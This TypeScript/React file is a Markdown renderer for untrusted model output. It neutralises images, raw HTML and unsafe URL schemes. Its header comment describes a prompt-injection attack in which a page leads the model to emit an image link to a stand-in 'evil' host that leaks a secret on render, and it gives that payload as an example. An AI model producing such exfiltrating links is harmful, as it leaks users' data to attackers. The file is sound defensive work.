import ReactMarkdown, { defaultUrlTransform, type Components } from "react-markdown";
import remarkGfm from "remark-gfm";

/**
 * Markdown renderer for MODEL OUTPUT. Model output is untrusted (a page can prompt-inject the model), so nothing in
 * it may make the browser fetch a remote resource on its own: an image like `![](https://evil/?q=<secret>)` would
 * exfiltrate data the moment it renders. Therefore:
 *  - images are never rendered as <img>; they become a plain link the user can choose to open;
 *  - raw HTML is dropped (no <iframe>/<video>/<link>/<style>…);
 *  - only http(s), mailto and in-message (#footnote) links survive; links open in a new tab without referrer.
 */
const SAFE_URL = /^(https?:|mailto:|#)/i;

export function safeUrl(url: string): string {
  const u = defaultUrlTransform(url);
  return SAFE_URL.test(u) ? u : "";
}

const components: Components = {
  img: ({ src, alt }) => {
    const href = typeof src === "string" ? safeUrl(src) : "";
    const label = `🖼 ${alt?.trim() || "图片"}`;
    return href ? (
      <a href={href} target="_blank" rel="noreferrer noopener" className="md-img-link" data-testid="md-image-link" title={href}>
        {label}
      </a>
    ) : (
      <span className="md-img-link">{label}</span>
    );
  },
  a: ({ node: _n, href, ...props }) => {
    const h = href ? safeUrl(href) : "";
    if (!h) return <span>{props.children}</span>;
    return h.startsWith("#") ? <a href={h} {...props} /> : <a href={h} {...props} target="_blank" rel="noreferrer noopener" />;
  },
};

export function SafeMarkdown({ children }: { children: string }) {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm]} skipHtml urlTransform={safeUrl} components={components}>
      {children}
    </ReactMarkdown>
  );
}
